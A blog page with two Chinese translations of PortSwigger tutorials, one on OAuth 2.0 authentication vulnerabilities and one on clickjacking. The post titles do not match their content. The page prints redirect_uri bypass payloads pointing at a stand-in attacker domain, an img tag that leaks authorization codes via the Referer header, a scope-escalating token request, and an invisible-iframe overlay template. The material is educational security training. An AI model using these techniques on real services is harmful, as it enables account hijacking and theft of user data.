<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://amiduai.github.io/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://amiduai.github.io"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-OAuth" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/02/18/OAuth/" class="article-date">
  <time class="dt-published" datetime="2025-02-17T16:07:17.000Z" itemprop="datePublished">2025-02-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/02/18/OAuth/">绕过 CSRF 令牌验证</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>在浏览网页时，你几乎肯定遇到过允许使用社交媒体账号登录的网站。很有可能，这一功能是使用广受欢迎的 OAuth 2.0 框架构建的。OAuth 2.0 对攻击者极具吸引力，因为它极为常见，而且本质上容易出现实施错误。这可能导致一系列漏洞，使攻击者能够获取敏感的用户数据，甚至有可能完全绕过身份验证。</p>
<p>在本节中，我们将教你如何识别和利用 OAuth 2.0 认证机制中发现的一些关键漏洞。如果你对 OAuth 认证不太熟悉，也不用担心 —— 我们提供了大量背景信息，帮助你理解所需的关键概念。我们还将探讨 OAuth 的 OpenID Connect 扩展中的一些漏洞。最后，我们给出了一些关于如何保护自己的应用程序免受此类攻击的指导。</p>
<p>本主题与 PortSwigger Research 合作撰写，同时发布的还有论文《隐藏的 OAuth 攻击向量》。</p>
<h2 id="什么是-OAuth？"><a href="#什么是-OAuth？" class="headerlink" title="什么是 OAuth？"></a>什么是 OAuth？</h2><p>OAuth 是一种常用的授权框架，它使网站和 Web 应用程序能够请求对用户在另一个应用程序中的账户进行有限访问。关键在于，OAuth 允许用户授予这种访问权限，而无需将其登录凭据暴露给请求的应用程序。这意味着用户可以微调他们想要分享的数据，而不必将账户的完全控制权交给第三方。</p>
<p>基本的 OAuth 流程被广泛用于集成需要访问用户账户中某些数据的第三方功能。例如，一个应用程序可能使用 OAuth 请求访问你的电子邮件联系人列表，以便它可以推荐你与之建立联系的人。然而，同样的机制也用于提供第三方身份验证服务，允许用户使用他们在其他网站上的账户登录。</p>
<p>注意：虽然 OAuth 2.0 是当前的标准，但一些网站仍在使用旧版本 1a。OAuth 2.0 是重新编写的，并非直接从 OAuth 1.0 发展而来。因此，两者有很大不同。请注意，在这些材料中，术语 “OAuth” 专门指 OAuth 2.0。</p>
<h2 id="OAuth-2-0-如何工作？"><a href="#OAuth-2-0-如何工作？" class="headerlink" title="OAuth 2.0 如何工作？"></a>OAuth 2.0 如何工作？</h2><p>OAuth 2.0 最初是作为一种在应用程序之间共享特定数据访问权限的方式而开发的。它通过定义三个不同方之间的一系列交互来工作，这三方分别是客户端应用程序、资源所有者和 OAuth 服务提供商。</p>
<p>客户端应用程序：想要访问用户数据的网站或 Web 应用程序。<br>资源所有者：客户端应用程序想要访问其数据的用户。<br>OAuth 服务提供商：控制用户数据及其访问权限的网站或应用程序。它们通过提供与授权服务器和资源服务器交互的 API 来支持 OAuth。<br>实际的 OAuth 流程有许多不同的实现方式，这些方式被称为 OAuth “流程” 或 “授权类型”。在本主题中，我们将重点关注 “授权码” 和 “隐式” 授权类型，因为它们是目前最常见的。大致来说，这两种授权类型都涉及以下阶段：</p>
<p>客户端应用程序请求访问用户数据的一个子集，指定它们想要使用的授权类型以及所需的访问类型。<br>提示用户登录到 OAuth 服务，并明确同意所请求的访问。<br>客户端应用程序接收一个唯一的访问令牌，证明它们已获得用户的许可，可以访问所请求的数据。具体的实现方式因授权类型而异。<br>客户端应用程序使用此访问令牌进行 API 调用，从资源服务器获取相关数据。<br>在学习 OAuth 如何用于身份验证之前，理解这个基本 OAuth 流程的基本原理非常重要。如果你对 OAuth 完全陌生，我们建议你在进一步阅读之前，先熟悉我们将要介绍的两种授权类型的详细信息。</p>
<p>虽然 OAuth 最初并非为此目的而设计，但它已发展成为一种用户身份验证方式。例如，你可能熟悉许多网站提供的使用现有社交媒体账户登录的选项，而无需在相关网站上注册。每当你看到这个选项时，很有可能它是基于 OAuth 2.0 构建的。</p>
<p>对于 OAuth 身份验证机制，基本的 OAuth 流程基本保持不变；主要区别在于客户端应用程序如何使用它接收到的数据。从最终用户的角度来看，OAuth 身份验证的结果大致类似于基于 SAML 的单点登录（SSO）。在这些材料中，我们将专门关注这种类似 SSO 用例中的漏洞。</p>
<p>身份验证通常按以下方式实现：</p>
<ol>
<li>用户选择使用其社交媒体账户登录的选项。然后，客户端应用程序使用社交媒体网站的 OAuth 服务请求访问一些可用于识别用户的数据，例如，可能是与其账户关联的电子邮件地址。</li>
<li>收到访问令牌后，客户端应用程序从资源服务器请求此数据，通常是从专用的 &#x2F;userinfo 端点获取。</li>
<li>收到数据后，客户端应用程序使用该数据代替用户名来登录用户。它从授权服务器收到的访问令牌通常代替传统密码使用。</li>
</ol>
<h2 id="OAuth-身份验证漏洞是如何产生的？"><a href="#OAuth-身份验证漏洞是如何产生的？" class="headerlink" title="OAuth 身份验证漏洞是如何产生的？"></a>OAuth 身份验证漏洞是如何产生的？</h2><p>OAuth 身份验证漏洞的产生部分原因是，OAuth 规范在设计上相对模糊和灵活。尽管每种授权类型的基本功能都有一些必需的组件，但绝大多数实现完全是可选的。这包括许多确保用户数据安全所必需的配置设置。简而言之，很容易出现不良实践。</p>
<p>OAuth 的另一个关键问题是普遍缺乏内置安全功能。安全性几乎完全依赖于开发人员正确组合使用配置选项，并在此基础上实施他们自己的额外安全措施，例如强大的输入验证。如你可能已经了解到的，需要考虑的内容很多，如果你对 OAuth 缺乏经验，很容易出错。</p>
<p>根据授权类型的不同，高度敏感的数据也会通过浏览器发送，这为攻击者提供了各种拦截数据的机会。</p>
<h2 id="识别-OAuth-身份验证"><a href="#识别-OAuth-身份验证" class="headerlink" title="识别 OAuth 身份验证"></a>识别 OAuth 身份验证</h2><p>识别一个应用程序何时使用 OAuth 身份验证相对简单。如果你看到使用其他网站账户登录的选项，这就是使用 OAuth 的一个强烈迹象。</p>
<p>识别 OAuth 身份验证最可靠的方法是通过 Burp 代理你的流量，并在使用此登录选项时检查相应的 HTTP 消息。无论使用哪种 OAuth 授权类型，流程的第一个请求始终是对 &#x2F;authorization 端点的请求，其中包含一些专门用于 OAuth 的查询参数。特别要留意 client_id、redirect_uri 和 response_type 参数。例如，一个授权请求通常如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /authorization?client_id=12345&amp;redirect_uri=https://client-app.com/callback&amp;response_type=token</span><br><span class="line">\&amp;scope=openid%20profile&amp;state=ae13d489bd00e3c24 HTTP/1.1 </span><br><span class="line">Host: oauth-authorization-server.com</span><br></pre></td></tr></table></figure>
<h2 id="侦察"><a href="#侦察" class="headerlink" title="侦察"></a>侦察</h2><p>对所使用的 OAuth 服务进行一些基本侦察，在识别漏洞时能为你指明正确方向。</p>
<p>不用说，你应该研究构成 OAuth 流程的各种 HTTP 交互 —— 我们稍后会详细介绍一些需要留意的具体内容。如果使用外部 OAuth 服务，你应该能够从授权请求发送到的主机名识别出特定的提供商。由于这些服务提供公共 API，通常会有详细的文档，告诉你各种有用信息，例如端点的确切名称以及正在使用的配置选项。</p>
<p>一旦你知道授权服务器的主机名，你应该始终尝试向以下标准端点发送 GET 请求：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/.well-known/oauth-authorization-server</span><br><span class="line">/.well-known/openid-configuration</span><br></pre></td></tr></table></figure>
<p>这些端点通常会返回一个 JSON 配置文件，其中包含关键信息，例如可能支持的其他功能的详细信息。这有时会让你了解到更广泛的攻击面以及文档中可能未提及的支持功能。</p>
<p>利用 OAuth 身份验证漏洞<br>漏洞可能出现在客户端应用程序对 OAuth 的实现中，也可能出现在 OAuth 服务本身的配置中。在本节中，我们将向你展示如何利用这两种情况下最常见的一些漏洞。</p>
<p>##OAuth 客户端应用程序中的漏洞<br>客户端应用程序通常会使用信誉良好、久经考验的 OAuth 服务，这种服务对广为人知的攻击有很好的防护。然而，它们自身的实现可能没那么安全。</p>
<p>如前所述，OAuth 规范的定义相对宽松。客户端应用程序的实现尤其如此。OAuth 流程中有许多变动部分，每种授权类型都有许多可选参数和配置设置，这意味着有很大的配置错误空间。</p>
<h3 id="隐式授权类型的不当实现"><a href="#隐式授权类型的不当实现" class="headerlink" title="隐式授权类型的不当实现"></a>隐式授权类型的不当实现</h3><p>由于通过浏览器发送访问令牌会带来风险，隐式授权类型主要推荐用于单页应用程序。然而，由于其相对简单，它也经常用于经典的客户端 - 服务器 Web 应用程序。</p>
<p>在这个流程中，访问令牌作为 URL 片段通过用户的浏览器从 OAuth 服务发送到客户端应用程序。然后，客户端应用程序使用 JavaScript 访问该令牌。问题是，如果应用程序希望在用户关闭页面后维护会话，它需要将当前用户数据（通常是用户 ID 和访问令牌）存储在某个地方。</p>
<p>为了解决这个问题，客户端应用程序通常会在 POST 请求中将此数据提交到服务器，然后为用户分配一个会话 cookie，实际上就是让用户登录。这个请求大致相当于作为经典的基于密码的登录的一部分可能发送的表单提交请求。然而，在这种情况下，服务器没有任何秘密或密码来与提交的数据进行比较，这意味着它被隐含地信任。</p>
<p>在隐式流程中，这个 POST 请求通过攻击者的浏览器暴露给攻击者。因此，如果客户端应用程序没有正确检查访问令牌是否与请求中的其他数据匹配，这种行为可能会导致严重的漏洞。在这种情况下，攻击者可以简单地更改发送到服务器的参数来冒充任何用户。</p>
<h3 id="有缺陷的-CSRF-保护"><a href="#有缺陷的-CSRF-保护" class="headerlink" title="有缺陷的 CSRF 保护"></a>有缺陷的 CSRF 保护</h3><p>尽管 OAuth 流程的许多组件是可选的，但除非有重要原因不使用，否则其中一些组件是强烈推荐的。state 参数就是这样一个例子。</p>
<p>state 参数理想情况下应包含一个不可猜测的值，例如在首次发起 OAuth 流程时与用户会话相关的某些内容的哈希值。然后，这个值在客户端应用程序和 OAuth 服务之间来回传递，作为客户端应用程序的一种 CSRF 令牌。因此，如果你注意到授权请求没有发送 state 参数，从攻击者的角度来看，这是非常有价值的信息。这可能意味着他们可以在诱使用户的浏览器完成 OAuth 流程之前自己发起该流程，类似于传统的 CSRF 攻击。根据客户端应用程序对 OAuth 的使用方式，这可能会产生严重后果。</p>
<p>考虑一个网站，用户既可以使用经典的基于密码的机制登录，也可以使用 OAuth 将其账户链接到社交媒体个人资料进行登录。在这种情况下，如果应用程序没有使用 state 参数，攻击者可能通过将受害者用户的账户绑定到他们自己的社交媒体账户来劫持该账户。</p>
<p>请注意，如果网站只允许用户通过 OAuth 登录，state 参数可能没那么关键。然而，不使用 state 参数仍然可能让攻击者构造登录 CSRF 攻击，诱使用户登录到攻击者的账户。</p>
<h3 id="泄露授权码和访问令牌"><a href="#泄露授权码和访问令牌" class="headerlink" title="泄露授权码和访问令牌"></a>泄露授权码和访问令牌</h3><p>也许最臭名昭著的基于 OAuth 的漏洞是，OAuth 服务本身的配置使攻击者能够窃取与其他用户账户相关的授权码或访问令牌。通过窃取有效的代码或令牌，攻击者可能能够访问受害者的数据。最终，这可能会完全危及他们的账户 —— 攻击者有可能在注册了此 OAuth 服务的任何客户端应用程序上以受害者用户的身份登录。</p>
<p>根据授权类型的不同，代码或令牌会通过受害者的浏览器发送到授权请求的 redirect_uri 参数中指定的 &#x2F;callback 端点。如果 OAuth 服务未能正确验证此 URI，攻击者可能能够构造类似 CSRF 的攻击，诱使受害者的浏览器发起 OAuth 流程，将代码或令牌发送到攻击者控制的 redirect_uri。</p>
<p>在授权码流程的情况下，攻击者可能在受害者的代码被使用之前窃取它。然后，他们可以将此代码发送到客户端应用程序合法的 &#x2F;callback 端点（原始的 redirect_uri）以访问用户的账户。在这种情况下，攻击者甚至不需要知道客户端密钥或生成的访问令牌。只要受害者与 OAuth 服务有有效的会话，客户端应用程序就会在攻击者的代表下完成代码 &#x2F; 令牌交换，然后让他们登录到受害者的账户。</p>
<p>请注意，使用 state 或 nonce 保护不一定能防止这些攻击，因为攻击者可以从他们自己的浏览器生成新的值。</p>
<p>更安全的授权服务器在交换代码时也会要求发送 redirect_uri 参数。然后，服务器可以检查这个参数是否与它在初始授权请求中收到的参数匹配，如果不匹配则拒绝交换。由于这是通过安全的后台通道在服务器到服务器的请求中发生的，攻击者无法控制这个第二个 redirect_uri 参数。</p>
<h3 id="有缺陷的-redirect-uri-验证"><a href="#有缺陷的-redirect-uri-验证" class="headerlink" title="有缺陷的 redirect_uri 验证"></a>有缺陷的 redirect_uri 验证</h3><p>由于在前一个实验中看到的各种攻击，客户端应用程序在向 OAuth 服务注册时提供其真实回调 URI 的白名单是最佳实践。这样，当 OAuth 服务收到新请求时，它可以根据这个白名单验证 redirect_uri 参数。在这种情况下，提供外部 URI 可能会导致错误。然而，可能仍然有办法绕过这种验证。</p>
<p>在审计 OAuth 流程时，你应该尝试试验 redirect_uri 参数，以了解它是如何被验证的。例如：</p>
<p>一些实现通过仅检查字符串是否以正确的字符序列开头（即批准的域名）来允许一定范围的子目录。你应该尝试删除或添加任意路径、查询参数和片段，看看在不触发错误的情况下你能更改什么。<br>如果你可以向默认的 redirect_uri 参数附加额外的值，你可能能够利用 OAuth 服务不同组件对 URI 解析的差异。例如，你可以尝试以下技术：<br><a target="_blank" rel="noopener" href="https://default-host.com/">https://default-host.com</a> &amp;@foo.evil-user.net#@bar.evil-user.net&#x2F;<br>如果你不熟悉这些技术，我们建议阅读我们关于如何绕过常见的 SSRF 防御和 CORS 的内容。</p>
<p>你偶尔可能会遇到服务器端参数污染漏洞。以防万一，你应该尝试按如下方式提交重复的 redirect_uri 参数：<a target="_blank" rel="noopener" href="https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net">https://oauth-authorization-server.com/?client_id=123&amp;redirect_uri=client-app.com/callback&amp;redirect_uri=evil-user.net</a><br>一些服务器也会对localhost URIs 给予特殊处理，因为它们经常在开发过程中使用。在某些情况下，生产环境中可能会意外允许任何以localhost开头的重定向 URI。这可能允许你通过注册诸如localhost.evil-user.net之类的域名来绕过验证。</p>
<p>重要的是要注意，你不应仅限于孤立地探测 redirect_uri 参数。在实际情况中，你通常需要尝试对几个参数进行不同组合的更改。有时更改一个参数会影响其他参数的验证。例如，将 response_mode 从 query 更改为 fragment 有时会完全改变 redirect_uri 的解析，允许你提交否则会被阻止的 URI。同样，如果你注意到支持 web_message 响应模式，这通常允许在 redirect_uri 中有更广泛的子域名。</p>
<h3 id="通过代理页面窃取代码和访问令牌"><a href="#通过代理页面窃取代码和访问令牌" class="headerlink" title="通过代理页面窃取代码和访问令牌"></a>通过代理页面窃取代码和访问令牌</h3><p>对于更强大的目标，你可能会发现无论你尝试什么，都无法成功提交外部域名作为 redirect_uri。然而，这并不意味着你该放弃。</p>
<p>到这个阶段，你应该对可以篡改 URI 的哪些部分有了相对较好的理解。现在的关键是利用这些知识尝试访问客户端应用程序内部更广泛的攻击面。换句话说，尝试弄清楚你是否可以更改 redirect_uri 参数，使其指向白名单域上的任何其他页面。</p>
<p>尝试找到能够成功访问不同子域名或路径的方法。例如，默认 URI 通常会在特定于 OAuth 的路径上，例如 &#x2F;oauth&#x2F;callback，这个路径不太可能有任何有趣的子目录。然而，你可能能够使用目录遍历技巧在该域上提供任意路径。类似于这样：<a target="_blank" rel="noopener" href="https://client-app.com/example/path">https://client-app.com/oauth/callback/../../example/path</a></p>
<p>在后端可能会被解释为：<a target="_blank" rel="noopener" href="https://client-app.com/example/path">https://client-app.com/example/path</a></p>
<p>一旦你确定可以将哪些其他页面设置为重定向 URI，你应该审计这些页面是否存在其他漏洞，以便你有可能利用这些漏洞泄露代码或令牌。对于授权码流程，你需要找到一个能让你访问查询参数的漏洞，而对于隐式授权类型，你需要提取 URL 片段。</p>
<p>为此目的最有用的漏洞之一是开放重定向。你可以将其用作代理，将受害者以及他们的代码或令牌转发到攻击者控制的域，在那里你可以托管任何你想要的恶意脚本。</p>
<p>请注意，对于隐式授权类型，窃取访问令牌不仅使你能够在客户端应用程序上登录受害者的账户。由于整个隐式流程是通过浏览器进行的，你还可以使用该令牌向 OAuth 服务的资源服务器进行自己的 API 调用。这可能使你能够获取通常无法从客户端应用程序的 Web UI 访问的敏感用户数据。</p>
<p>除了开放重定向，你还应该寻找任何其他允许你提取代码或令牌并将其发送到外部域的漏洞。一些很好的例子包括：</p>
<p>处理查询参数和 URL 片段的危险 JavaScript：例如，不安全的 Web 消息传递脚本就很适合这种情况。在某些情况下，你可能需要识别一个更长的小工具链，使你能够将令牌通过一系列脚本传递，最终泄露到你的外部域。<br>XSS 漏洞：虽然 XSS 攻击本身可能会产生巨大影响，但通常攻击者在用户关闭标签或导航离开之前访问用户会话的时间很短。由于 HTTPOnly 属性通常用于会话 cookie，攻击者通常也无法使用 XSS 直接访问它们。然而，通过窃取 OAuth 代码或令牌，攻击者可以在自己的浏览器中访问用户的账户。这使他们有更多时间探索用户的数据并执行有害操作，显著增加了 XSS 漏洞的严重性。<br>HTML 注入漏洞：在无法注入 JavaScript 的情况下（例如，由于内容安全策略（CSP）限制或严格的过滤机制），你仍有可能利用简单的 HTML 注入来窃取授权码。如果你能够将 redirect_uri 参数指向一个你可以注入自定义 HTML 内容的页面，那么你或许能够通过 Referer 头部泄露该代码。例如，考虑以下 img 元素：<img src="evil-user.net">。当浏览器尝试获取此图片时，某些浏览器（如 Firefox）会在请求的 Referer 头部中发送完整的 URL，其中包括查询字符串。</p>
<h2 id="作用域验证缺陷"><a href="#作用域验证缺陷" class="headerlink" title="作用域验证缺陷"></a>作用域验证缺陷</h2><p>在任何 OAuth 流程中，用户必须根据授权请求中定义的作用域，批准所请求的访问权限。最终生成的令牌仅允许客户端应用程序访问用户批准的作用域。但在某些情况下，由于 OAuth 服务的验证存在缺陷，攻击者有可能 “提升” 访问令牌（无论是窃取的还是使用恶意客户端应用程序获取的）的权限。实现此操作的过程取决于授权类型。</p>
<h3 id="作用域提升：授权码流程"><a href="#作用域提升：授权码流程" class="headerlink" title="作用域提升：授权码流程"></a>作用域提升：授权码流程</h3><p>对于授权码授权类型，用户数据是通过安全的服务器到服务器通信进行请求和发送的，第三方攻击者通常无法直接操纵。然而，攻击者仍有可能通过在 OAuth 服务中注册自己的客户端应用程序来达到相同的结果。</p>
<p>例如，假设攻击者的恶意客户端应用程序最初使用openid email作用域请求访问用户的电子邮件地址。用户批准此请求后，恶意客户端应用程序会收到一个授权码。由于攻击者控制着他们的客户端应用程序，他们可以在代码 &#x2F; 令牌交换请求中添加另一个作用域参数，其中包含额外的profile作用域：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /token </span><br><span class="line">Host: oauth-authorization-server.com </span><br><span class="line">… </span><br><span class="line"></span><br><span class="line">client_id=12345&amp;client_secret=SECRET&amp;redirect_uri=https://client-app.com/callback&amp;grant_type</span><br><span class="line">=authorization_code&amp;code=a1b2c3d4e5f6g7h8&amp;scope=openid%20 email%20profile</span><br></pre></td></tr></table></figure>
<p>如果服务器不对照初始授权请求中的作用域对其进行验证，有时会使用新的作用域生成一个访问令牌，并将其发送到攻击者的客户端应用程序：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;access_token&quot;</span><span class="punctuation">:</span> <span class="string">&quot;z0y9x8w7v6u5&quot;</span><span class="punctuation">,</span> </span><br><span class="line">  <span class="attr">&quot;token_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Bearer&quot;</span><span class="punctuation">,</span> </span><br><span class="line">  <span class="attr">&quot;expires_in&quot;</span><span class="punctuation">:</span> <span class="number">3600</span><span class="punctuation">,</span> </span><br><span class="line">  <span class="attr">&quot;scope&quot;</span><span class="punctuation">:</span> <span class="string">&quot;openid email profile&quot;</span><span class="punctuation">,</span></span><br><span class="line">  … </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>然后，攻击者可以使用他们的应用程序进行必要的 API 调用，以访问用户的个人资料数据。</p>
<h3 id="作用域提升：隐式流程"><a href="#作用域提升：隐式流程" class="headerlink" title="作用域提升：隐式流程"></a>作用域提升：隐式流程</h3><p>对于隐式授权类型，访问令牌是通过浏览器发送的，这意味着攻击者可以窃取与无辜客户端应用程序相关联的令牌并直接使用。一旦他们窃取了访问令牌，就可以向 OAuth 服务的&#x2F;userinfo端点发送基于浏览器的常规请求，并在此过程中手动添加一个新的作用域参数。</p>
<p>理想情况下，OAuth 服务应将此作用域值与生成令牌时使用的作用域值进行验证，但情况并非总是如此。只要调整后的权限不超过先前授予此客户端应用程序的访问级别，攻击者就有可能在无需用户进一步批准的情况下访问额外数据。</p>
<h2 id="未经验证的用户注册"><a href="#未经验证的用户注册" class="headerlink" title="未经验证的用户注册"></a>未经验证的用户注册</h2><p>通过 OAuth 对用户进行身份验证时，客户端应用程序会默认假定 OAuth 提供程序存储的信息是正确的。这可能是一个危险的假设。</p>
<p>一些提供 OAuth 服务的网站允许用户注册账户，而无需验证其所有详细信息，在某些情况下甚至包括电子邮件地址。攻击者可以利用这一点，使用与目标用户相同的详细信息（如已知的电子邮件地址）在 OAuth 提供程序处注册账户。然后，客户端应用程序可能会允许攻击者通过 OAuth 提供程序的这个欺诈性账户以受害者身份登录。</p>
<h2 id="用-OpenID-Connect-扩展-OAuth"><a href="#用-OpenID-Connect-扩展-OAuth" class="headerlink" title="用 OpenID Connect 扩展 OAuth"></a>用 OpenID Connect 扩展 OAuth</h2><p>在用于身份验证时，OAuth 通常会通过 OpenID Connect 层进行扩展，该层提供了一些与识别和验证用户相关的额外功能。有关这些功能的详细描述，以及与它们可能引入的漏洞相关的更多实验，请参阅我们的 OpenID Connect 主题。</p>
<h2 id="防范-OAuth-身份验证漏洞"><a href="#防范-OAuth-身份验证漏洞" class="headerlink" title="防范 OAuth 身份验证漏洞"></a>防范 OAuth 身份验证漏洞</h2><p>对于开发人员，我们提供了一些指南，说明如何避免在自己的网站和应用程序中引入这些漏洞。</p>
<p>本文翻译自portswigger文章：How to prevent OAuth authentication vulnerabilities</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://amiduai.github.io/2025/02/18/OAuth/" data-id="cm796nppi0000o46sfv32cc7v" data-title="绕过 CSRF 令牌验证" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-clickhijacking" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/02/17/clickhijacking/" class="article-date">
  <time class="dt-published" datetime="2025-02-16T16:07:17.000Z" itemprop="datePublished">2025-02-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/02/17/clickhijacking/">CORS</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>在本节中，我们将解释什么是点击劫持，描述点击劫持攻击的常见示例，并讨论如何防范这些攻击。</p>
<h2 id="什么是点击劫持？"><a href="#什么是点击劫持？" class="headerlink" title="什么是点击劫持？"></a>什么是点击劫持？</h2><p>点击劫持是一种基于界面的攻击方式，攻击者诱使用户点击诱饵网站上的某些内容，而实际上用户却在不知情的情况下点击了隐藏网站上的可操作内容。来看下面这个例子：</p>
<p>一位网络用户访问了一个诱饵网站（可能是通过电子邮件提供的链接），并点击一个按钮以赢取奖品。不知不觉中，他们被攻击者欺骗，实际上按下了另一个隐藏的按钮，这导致在另一个网站上的账户进行了支付。这就是一个点击劫持攻击的例子。这种技术依赖于在一个 iframe 中嵌入一个不可见的、包含按钮或隐藏链接的可操作网页（或多个页面）。该 iframe 覆盖在用户预期的诱饵网页内容之上。这种攻击与 CSRF 攻击的不同之处在于，点击劫持要求用户执行诸如点击按钮之类的操作，而 CSRF 攻击则是在用户不知情或未输入的情况下伪造整个请求。</p>
<h2 id="防范点击劫持"><a href="#防范点击劫持" class="headerlink" title="防范点击劫持"></a>防范点击劫持</h2><p>防范 CSRF 攻击通常会使用 CSRF 令牌，即一个特定于会话的一次性数字或随机数。CSRF 令牌无法缓解点击劫持攻击，因为目标会话是通过从可信网站加载的内容建立的，且所有请求都在同一域名内发生。CSRF 令牌会被放入请求中，并作为正常会话的一部分传递给服务器。与正常用户会话的区别在于，这个过程发生在一个隐藏的 iframe 中。</p>
<p>如何构建基本的点击劫持攻击<br>点击劫持攻击使用 CSS 来创建和操作图层。攻击者将目标网站作为一个 iframe 图层叠加在诱饵网站之上。使用 style 标签和参数的示例如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-id">#target_website</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">position</span>:relative;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>:<span class="number">128px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>:<span class="number">128px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">opacity</span>:<span class="number">0.00001</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">z-index</span>:<span class="number">2</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-id">#decoy_website</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">position</span>:absolute;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>:<span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>:<span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">z-index</span>:<span class="number">1</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;decoy_website&quot;</span>&gt;</span></span><br><span class="line">    ...这里是诱饵网页内容...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;target_website&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://vulnerable-website.com&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
